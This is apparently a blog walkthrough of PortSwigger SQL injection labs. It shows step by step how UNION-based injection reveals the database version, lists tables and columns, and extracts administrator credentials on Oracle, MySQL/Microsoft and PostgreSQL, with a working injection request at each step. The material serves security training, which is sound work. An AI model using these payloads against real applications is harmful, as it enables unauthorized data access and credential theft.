---
layout: post
title:  "Walkthroughs: Examining the database in SQL injection attacks"
date:   2022-11-11 09:00:21 +0200
author: Clara Hällgren
---

Knowing the database type and version is often key to successfully exploit an SQLi vulnerability. This is done
differently on different databases, as they have different commands to retrieve that data. In these labs we will view
how you can gain type and version knowledge via SQLi.

## LAB: SQL injection attack, querying the database type and version on Oracle

In this lab, we will exploit a SQLi vulnerability in the product category filter with a UNION attack. The objective is
to display the database version string. From the title we know that it is an oracle database which means we need to use
"SELECT banner FROM v$version" according to Portswiggers SQLi cheat sheet. 

Step 1: I use the ORDER BY method to determine how many columns are mandatory to use the UNION command. The result is 2.
I do this by adding 'ORDER BY 3-- to the request which gives me an error, although if I change the 3 to a 2, I don't get an error
and my magic number is 2.

Step 2: Now I need to determine which of the two columns that can hold a string. I do this with the 
'UNION+SELECT+null,null+FROM+v$version-- and change the two null values to strings one after the other. The first position
can hold a null value, so I use that one. 

Step 3: the attack can now be formed, and I send this request: 

    GET /filter?category=Accessories'UNION+SELECT+banner,null+FROM+v$version--

Which solves the lab. 

If you don't understand why I did what I did, I recommend reading my previous post on SQLi Union attacks.

## LAB: SQL injection attack, querying the database type and version on MySQL and Microsoft

This is the same thing as the previous lab except that the database is no longer Oracle which means we need to 
turn to the cheat sheet again to view the syntax for Microsoft and MySQL. I happen to know that they have the exact same 
syntax for version requests. Aka: SELECT @@version. They also both use the double-dash to comment out any lines, with one important
difference: MySQL requires a space after the double dash. 

Step 1: I use ORDER BY method again. But this time I get an error even when the number is set to one. I realise that the space after
the double-dash is needed and that it probably will be cut away if I don't add anything after it. Therefore, I simply add a space
and some random letters after it which gives me what I want. The magic number is 2 also in this case.

Step 2: This is the same as in step two of the previous lab. Except that you need to add the "-- abc" just like in step one.
The first position can hold a string so I go with that one. 

Step 3: The attack can be formed according to step 1 and 2 + the knowledge from the cheat sheet. This solves the lab:

    GET /filter?category=Lifestyle'UNION+SELECT+@@version,null--+abc

## LAB: Listing the database contents on non oracle databases

Most database types, except oracle hence the lab name, have views that provide database information. This is called the information
schema which can be queried with SELECT * FROM information_schema.tables which returns the table names. Once you have the
table names, you can query SELECT FROM information.schema.columns WHERE table_name ='Users' for example, and get the column 
information of that table. The objective of this lab is to log in as the administrator. 

Step 1: I figure out that I need to query 2 columns and both can hold strings with the ORDER BY method and NULL method. 
I determine the database type as in the previous labs and note that it is a PostgreSQL database that we are dealing with. 

Step 2: I use the above-mentioned query, and it fails if I use the '*' (aka all) sign. Therefore, I try with table_name instead. 
This gives me loads of table names, so I filter the results on "user" in Burp Suite and find "users_xghqki". Spen some time viewing the
table names. There are many in that list that wants to fool you.

    GET /filter?category=Gifts'UNION+SELECT+null,table_name+FROM+information_schema.tables--

Step 3: Now I query the "users_xghqki" table for its columns. This gives me two column names "username_yoipfp" and "password_jnfict".

    GET /filter?category=Gifts'UNION+SELECT+null,column_name+FROM+information_schema.columns+WHERE+table_name='users_xghqki'--

Step 4: Query the content of the columns which gives me the administrators log in credentials. Lab solved. 

    GET /filter?category=Gifts'UNION+SELECT+username_yoipfp,password_jnfict+FROM+users_xghqki--

## LAB: Listing the database contents on Oracle

Same as above but for an Oracle Database. This means we need to use different queries than above, a tip is to always 
look in the SQL cheat sheet. Let's go!

Step 1: Find out the number of columns and if they can hold strings. 2 Columns are needed and both can hold strings. Getting errors?
Remember that this is an Oracle database that requires a FROM part in the query. Oracle databases always have a table named 
dual which can be used in this case. 

    GET /filter?category=Lifestyle'UNION+SELECT+null,+null+FROM+dual--

Step 2: I look at the cheat sheet and note how to get the table names on Oracle, which gives me the table "USERS_UYKKWM".

    GET /filter?category=Lifestyle'UNION+SELECT+table_name,+null+FROM+all_tables--

Step 3: Get the column names from that table. I got USERNAME_HHQHXN and PASSWORD_ZDKKSY.

    GET /filter?category=Lifestyle'UNION+SELECT+column_name,+null+FROM+all_tab_columns+WHERE+table_name+%3d+'USERS_UYKKWM'--

Step 4: Get the content of the columns and log in as administrator. Lab solved. 
    
    GET /filter?category=Lifestyle'UNION+SELECT+USERNAME_HHQHXN,+PASSWORD_ZDKKSY+FROM+USERS_UYKKWM--

